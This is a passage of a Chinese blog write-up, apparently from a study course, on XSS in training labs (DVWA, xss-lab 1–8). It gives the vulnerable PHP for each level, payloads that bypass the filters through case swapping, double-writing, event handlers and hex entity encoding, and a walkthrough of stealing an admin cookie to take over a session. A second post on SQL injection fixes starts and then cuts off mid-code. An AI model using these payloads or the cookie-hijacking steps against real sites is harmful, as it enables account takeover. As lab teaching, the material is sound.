javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//大小写</span></span><br><span class="line">&lt;<span class="title class_">SCript</span>&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/<span class="title class_">SCript</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251551061.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//既然不让用script标签，就换标签</span><br><span class="line">&lt;img src=1 onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251554002.png"></p><p>成功弹窗！！！</p><h4 id="③high"><a href="#③high" class="headerlink" title="③high"></a>③high</h4><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对匹配到的<script>字符串进行多次过滤，并且大小写不敏感，所以不能使用大小写和双写绕过</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//img标签</span><br><span class="line">&lt;img src=1 onerror=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251559262.png"></p><p>成功弹窗！！！</p><h3 id="2、三种XSS漏洞以及三者的区别"><a href="#2、三种XSS漏洞以及三者的区别" class="headerlink" title="2、三种XSS漏洞以及三者的区别"></a>2、三种XSS漏洞以及三者的区别</h3><h4 id="①反射型"><a href="#①反射型" class="headerlink" title="①反射型"></a>①反射型</h4><p>反射型xss将输入的数据，经过后端处理后，返回到前端代码中，属于一次性攻击，下一次访问时不会触发，如搜索框</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251606020.png"></p><h4 id="②存储型"><a href="#②存储型" class="headerlink" title="②存储型"></a>②存储型</h4><p>存储型xss将输入的数据保存在数据库里，再返回到前端代码里，属于持久性攻击，下一次访问时会从数据库调取资源导致触发，如留言板</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251610571.png"></p><p>提交数据保存</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251610551.png"></p><p>然后去到其他页面，再重新访问这个页面</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251611044.png"></p><h4 id="③dom型"><a href="#③dom型" class="headerlink" title="③dom型"></a>③dom型</h4><p>DOM 型 XSS 攻击不同于传统的存储型 XSS，它发生在客户端，不经过服务器，通过操作 DOM 实现攻击，如url，输入框</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251613471.png"></p><h3 id="3、xss-lab1-8实战"><a href="#3、xss-lab1-8实战" class="headerlink" title="3、xss-lab1-8实战"></a>3、xss-lab1-8实战</h3><h4 id="①lab1"><a href="#①lab1" class="headerlink" title="①lab1"></a>①lab1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>并未做任何防护措施，直接将用户的输入返回，直接构造xss语句</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251621015.png"></p><p>成功弹窗！！！</p><h4 id="②lab2"><a href="#②lab2" class="headerlink" title="②lab2"></a>②lab2</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>虽然将第一个回显位进行了html实体编码处理，但是第二个回显位未进行处理，可以在第二个回显位做文章</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;.$str.&#x27;&quot;</span>&gt;</span></span><br><span class="line">由于value是使用双引号包裹字符的，所以构造&quot;&gt;与前面进行闭合</span><br><span class="line">payload：&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">构造完之后代码拼接为</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251626427.png"></p><p>成功弹窗！！！</p><h4 id="③lab3"><a href="#③lab3" class="headerlink" title="③lab3"></a>③lab3</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&quot;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处对两个回显位都做了实体编码，实体编码默认情况下会对&amp; &quot; &lt; &gt;这四个符号进行编码，但是默认情况不对 &#39; 进行编码</p><p>对第二个回显位进行构造</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;</span>&gt;</span></span><br><span class="line">构造鼠标点击事件，由于是使用&#x27;包裹字符，所以使用&#x27;进行闭合</span><br><span class="line">payload：&#x27; onclick=&#x27;alert(/xss/)</span><br><span class="line">构造完之后代码拼接为</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">onclick</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251636707.png"></p><p>成功弹窗！！！</p><h4 id="④lab4"><a href="#④lab4" class="headerlink" title="④lab4"></a>④lab4</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里对&lt;&gt;进行了过滤，并且在第一个回显位做了实体编码，但是第二个回显位没做实体编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&#x27;.$str3.&#x27;&quot;</span>&gt;</span></span><br><span class="line">可以再此使用上一关payload，但是这里用的是双引号包裹字符串，做一下变换</span><br><span class="line">payload：&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251642689.png"></p><p>成功弹窗！！！</p><h4 id="⑤lab5"><a href="#⑤lab5" class="headerlink" title="⑤lab5"></a>⑤lab5</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里将输入数据全进行了小写转换，并且过滤了script和on，第一个回显位做了实体编码，第二个回显位未做实体编码，这里需要运用到<a href>标签，这个标签会生成一个超链接</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">payload：&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251726374.png"></p><p>成功弹窗！！！</p><h4 id="⑥lab6"><a href="#⑥lab6" class="headerlink" title="⑥lab6"></a>⑥lab6</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对script,on,src,data,href进行了过滤，并且在第一个回显位做了实体编码，但是没有大小写敏感，尝试大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;SCriPt&gt;alert(&#x27;xss&#x27;)&lt;/ScRIpt&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251710805.png"></p><h4 id="⑦lab7"><a href="#⑦lab7" class="headerlink" title="⑦lab7"></a>⑦lab7</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str6</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里做了小写转换，并且将匹配的字符串替换为空，尝试进行双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(&#x27;xss&#x27;)&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251715187.png"></p><p>成功弹窗！！！</p><h4 id="⑧lab8"><a href="#⑧lab8" class="headerlink" title="⑧lab8"></a>⑧lab8</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br><span class="line"><span class="variable">$str7</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,<span class="variable">$str6</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里将输入数据全进行了小写转换，并且过滤了许多字符串并且做了实体编码，这里将输入内容生成了个超链接</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251723465.png"></p><p>href标签特性，当点击超链接时，浏览器会自动对16进制实体编码进行解析，但输入数据时，服务器未做解析，所以就可以绕过后端代码的过滤处理，最后点击链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将javascript:alert(/xss/)进行16进制实体编码:&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251724618.png"></p><p>成功弹窗！！！</p><h3 id="4、xss防御手段"><a href="#4、xss防御手段" class="headerlink" title="4、xss防御手段"></a>4、xss防御手段</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//实体编码，防御&lt; &gt; &quot; &amp;，默认情况不防御&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251731934.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符串替换，将匹配到的字符串替换为定义的字符串</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;匹配的字符串&quot;</span>,<span class="string">&quot;定义的字符串&quot;</span>,<span class="variable">$str</span>)</span><br><span class="line"><span class="comment">//示例，将字符串&lt;script，替换为&lt;scr_ipt</span></span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251734294.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将字符串全转换为小写</span></span><br><span class="line"><span class="title function_ invoke__">strtolower</span>()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251739090.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251740180.png"></p><h3 id="5、xss盲打"><a href="#5、xss盲打" class="headerlink" title="5、xss盲打"></a>5、xss盲打</h3><p>xss盲打需要存在存储型xss，并且是普通用户进行输入，管理员进行查看，如意见反馈</p><p>在客户端页面的xss盲打表单中输入xss语句，点击提交</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251749000.png"></p><p>进入后台，进行登录，账号admin，密码123456</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251750228.png"></p><p>提交登录时发生了弹窗</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="cookie劫持"><a href="#cookie劫持" class="headerlink" title="cookie劫持"></a>cookie劫持</h3><p>用户输入端构造xss语句，点击提交</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">document.cookie//将cooike值保存为文档</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251754974.png"></p><p>后台端刷新页面，成功弹出cookie，将cookie复制下来</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251755504.png"></p><p>新开个浏览器进入后台登录页面，得使用同款浏览器，不然ua头不对可能导致失败</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251757461.png"></p><p>打开F12，进入存储，新建cookie，将刚才的cookie复制进去</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251824982.png"></p><p>输入后台的url地址，然后回车</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251825106.png"></p><p>成功进入管理员端</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-sql注入(3)</title>
      <link href="/2025/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(3)/"/>
      <url>/2025/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-sql%E6%B3%A8%E5%85%A5(3)/</url>
      
        <content type="html"><![CDATA[<h3 id="1、修复sqli-lab靶场的宽字节注入、万能密码、二次注入、堆叠注入"><a href="#1、修复sqli-lab靶场的宽字节注入、万能密码、二次注入、堆叠注入" class="headerlink" title="1、修复sqli-lab靶场的宽字节注入、万能密码、二次注入、堆叠注入"></a>1、修复sqli-lab靶场的宽字节注入、万能密码、二次注入、堆叠注入</h3><h4 id="①宽字节注入修复"><a href="#①宽字节注入修复" class="headerlink" title="①宽字节注入修复"></a>①宽字节注入修复</h4><p>原代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span 